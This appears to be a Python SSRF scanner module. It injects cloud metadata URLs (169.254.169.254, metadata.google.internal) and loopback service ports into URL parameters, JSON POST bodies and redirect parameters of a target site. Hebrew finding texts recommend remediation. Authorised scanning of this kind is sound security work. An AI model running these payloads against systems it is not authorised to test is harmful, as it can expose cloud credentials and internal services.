"""
SSRF Scanner
------------
Server-Side Request Forgery detection.

Techniques:
  1. Inject internal IPs into known URL-type parameters
  2. Test cloud metadata endpoints (AWS, GCP, Azure)
  3. Error-based detection: compare responses to internal vs external
  4. Timing-based: internal addresses cause delays or timeouts
  5. Redirect parameter abuse: check if server follows redirects to internal IPs
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx


@dataclass
class Finding:
    severity: str
    category: str
    title: str
    description: str
    evidence: list = field(default_factory=list)
    recommendation: str = ""


# Parameters that commonly accept URLs
_URL_PARAMS = [
    "url", "uri", "link", "href", "src", "source", "target",
    "redirect", "redirect_url", "redirect_uri", "next", "return",
    "return_url", "returnurl", "callback", "callbackurl", "feed",
    "data", "path", "file", "page", "show", "img", "image",
    "document", "load", "content", "fetch", "resource", "forward",
    "proxy", "from", "to", "out", "go", "open", "service", "host",
    "domain", "endpoint", "site", "webhook", "hook",
]

# Internal targets to inject — (url, label, severity)
_SSRF_TARGETS = [
    # Cloud metadata — most impactful
    ("http://169.254.169.254/latest/meta-data/",            "aws-metadata",   "critical"),
    ("http://169.254.169.254/latest/user-data/",            "aws-userdata",   "critical"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata",   "critical"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure-metadata", "critical"),
    # Loopback
    ("http://127.0.0.1/",                                   "loopback",       "high"),
    ("http://127.0.0.1:8080/",                              "loopback-8080",  "high"),
    ("http://127.0.0.1:8000/",                              "loopback-8000",  "high"),
    ("http://0.0.0.0/",                                     "loopback-alt",   "high"),
    ("http://localhost/",                                    "localhost",      "high"),
    # Internal ports
    ("http://127.0.0.1:2375/",                              "docker-api",     "critical"),
    ("http://127.0.0.1:2379/",                              "etcd",           "critical"),
    ("http://127.0.0.1:9200/",                              "elasticsearch",  "high"),
    ("http://127.0.0.1:6379/",                              "redis",          "high"),
    ("http://127.0.0.1:3306/",                              "mysql",          "medium"),
    ("http://127.0.0.1:5432/",                              "postgres",       "medium"),
    ("http://127.0.0.1:27017/",                             "mongodb",        "medium"),
]

# Markers that indicate SSRF success in response body
_SSRF_BODY_INDICATORS = [
    re.compile(r"ami-id|instance-id|instance-type|placement", re.I),    # AWS
    re.compile(r"computeMetadata|project-id|service-account", re.I),    # GCP
    re.compile(r'"compute":\s*\{|"network":\s*\{', re.I),               # Azure
    re.compile(r"ssh-rsa\s+[A-Za-z0-9+/]+"),                            # SSH keys
    re.compile(r"root:.*?:/root|daemon:.*?:/bin"),                       # /etc/passwd
    re.compile(r'"version"\s*:\s*"\d+\.\d+', re.I),                     # Internal API
    re.compile(r"REDIS\s+\d+\.\d+", re.I),                              # Redis banner
    re.compile(r'"_cluster"\s*:|"nodes"\s*:\s*\{', re.I),               # Elasticsearch
]


def _is_ssrf_body(body: str) -> bool:
    for pat in _SSRF_BODY_INDICATORS:
        if pat.search(body):
            return True
    return False


async def scan_ssrf(base_url: str) -> list[Finding]:
    findings: list[Finding] = []
    base = base_url.rstrip("/")
    tested: set[str] = set()

    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        "Accept": "*/*",
    }

    async with httpx.AsyncClient(headers=headers, verify=False) as client:

        # ── 1. Inject URL params into the base URL ────────────────────────────
        parsed = urlparse(base_url)
        existing_qs = parse_qs(parsed.query)

        # Test each URL-type param with the most dangerous SSRF targets
        for param in _URL_PARAMS:
            for target_url, target_name, severity in _SSRF_TARGETS[:8]:
                key = f"{param}|{target_url}"
                if key in tested:
                    continue
                tested.add(key)

                test_qs = dict(existing_qs)
                test_qs[param] = [target_url]
                new_query = urlencode({k: v[0] for k, v in test_qs.items()})
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    start = time.monotonic()
                    r = await client.get(test_url, follow_redirects=False, timeout=6)
                    elapsed = time.monotonic() - start
                    body = r.text[:4000]

                    if _is_ssrf_body(body):
                        findings.append(Finding(
                            severity, "ssrf",
                            f"SSRF — פרמטר {param!r} → {target_name}",
                            f"פרמטר '{param}' עם {target_url} גרם לשרת לפנות לכתובת פנימית. "
                            "התגובה מכילה תוכן פנימי (metadata / banner / etc.).",
                            [
                                f"URL: {test_url}",
                                f"Injected: {target_url}",
                                f"Status: {r.status_code}",
                                f"Response time: {elapsed:.2f}s",
                                f"Evidence snippet: {body[:300]}",
                            ],
                            "אל תאפשר לשרת לפנות ל-URLs שמגיעים מהמשתמש. "
                            "אם חייב — allowlist קפדני של domains + חסום IPs פנימיים (RFC1918, 169.254.x.x).",
                        ))
                        break  # Enough evidence for this param

                    # Timing-based: internal address causes delay
                    if elapsed > 4.5 and target_name in ("loopback", "localhost", "loopback-alt"):
                        findings.append(Finding(
                            "medium", "ssrf",
                            f"SSRF חשוד (עיכוב {elapsed:.1f}s) — פרמטר {param!r}",
                            f"בקשה עם {target_url} גרמה לעיכוב של {elapsed:.1f}s — "
                            "ייתכן שהשרת מנסה להתחבר לכתובת הפנימית.",
                            [f"URL: {test_url}", f"Delay: {elapsed:.2f}s", f"Status: {r.status_code}"],
                            "בדוק ידנית. חסום בקשות לכתובות פנימיות.",
                        ))

                except asyncio.TimeoutError:
                    # Timeout on an internal IP = server is trying (and blocking)
                    findings.append(Finding(
                        "medium", "ssrf",
                        f"SSRF חשוד (timeout) — פרמטר {param!r} → {target_name}",
                        f"פרמטר '{param}' עם {target_url} גרם ל-timeout. "
                        "ייתכן שהשרת מנסה לפנות לכתובת הפנימית.",
                        [f"Injected: {target_url}", f"Param: {param}"],
                        "חסום בקשות ל-RFC1918 ו-169.254.x.x בצד השרת.",
                    ))
                except Exception:
                    continue

        # ── 2. POST-based SSRF on common endpoints ────────────────────────────
        post_endpoints = [
            "/api/fetch", "/api/proxy", "/api/preview", "/api/screenshot",
            "/api/webhook", "/webhook", "/proxy", "/fetch",
        ]
        for ep in post_endpoints:
            url = base + ep
            if url in tested:
                continue
            tested.add(url)

            for target_url, target_name, severity in _SSRF_TARGETS[:3]:
                payloads = [
                    {param: target_url}
                    for param in ("url", "uri", "target", "endpoint", "source")
                ]
                for payload in payloads:
                    try:
                        start = time.monotonic()
                        r = await client.post(url, json=payload, timeout=6,
                                              headers={**headers, "Content-Type": "application/json"})
                        elapsed = time.monotonic() - start
                        body = r.text[:4000]

                        if r.status_code in (200, 201) and _is_ssrf_body(body):
                            findings.append(Finding(
                                severity, "ssrf",
                                f"SSRF — POST {ep} → {target_name}",
                                f"POST ל-{ep} עם payload {payload} גרם לשרת לפנות לכתובת פנימית.",
                                [
                                    f"URL: {url}",
                                    f"Payload: {payload}",
                                    f"Status: {r.status_code}",
                                    f"Evidence: {body[:300]}",
                                ],
                                "חסום פניות ל-URLs פנימיים. הוסף allowlist.",
                            ))
                            break
                    except Exception:
                        continue

        # ── 3. Open redirect to internal IP ───────────────────────────────────
        redirect_params = ["redirect", "next", "return", "url", "goto", "callback"]
        for param in redirect_params:
            test_url = f"{base}?{param}=http://169.254.169.254/latest/meta-data/"
            if test_url in tested:
                continue
            tested.add(test_url)
            try:
                r = await client.get(test_url, follow_redirects=False, timeout=6)
                location = r.headers.get("location", "")
                if "169.254" in location:
                    findings.append(Finding(
                        "high", "ssrf",
                        f"Open Redirect לכתובת פנימית — ?{param}=",
                        f"פרמטר ?{param}= מבצע redirect לכתובת פנימית (169.254.169.254). "
                        "בשילוב עם SSRF — עלול לחשוף cloud metadata.",
                        [f"URL: {test_url}", f"Location: {location}", f"Status: {r.status_code}"],
                        "חסום redirect לכתובות חיצוניות ופנימיות. השתמש ב-allowlist.",
                    ))
            except Exception:
                continue

    if not [f for f in findings if f.severity not in ("info",)]:
        findings.append(Finding(
            "info", "ssrf",
            f"SSRF — לא זוהו פרמטרים פגיעים",
            f"נבדקו {len(_URL_PARAMS)} פרמטרי URL ו-{len(_SSRF_TARGETS)} יעדים פנימיים. "
            "בדיקה ידנית מומלצת עם Burp Collaborator.",
            [f"Base URL: {base_url}", f"Params tested: {len(_URL_PARAMS)}"],
        ))

    return findings
